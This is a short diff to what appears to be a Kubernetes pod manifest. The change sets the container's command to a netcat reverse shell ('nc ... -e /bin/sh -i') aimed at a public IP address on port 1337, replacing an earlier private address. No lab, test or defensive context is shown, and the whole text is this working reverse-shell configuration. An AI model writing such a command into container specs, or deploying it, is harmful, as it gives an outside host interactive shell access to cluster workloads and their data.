@@ -20,7 +20,7 @@ spec:
           allowPrivilegeEscalation: false
         stdin: true
         tty: true
-        command: ['/bin/nc', '10.29.245.2', '1337', '-e', '/bin/ash', '-i']
+        command: ['/bin/nc', '82.139.253.26', '1337', '-e', '/bin/sh', '-i']
         resources:
           requests:
             memory: "64Mi"
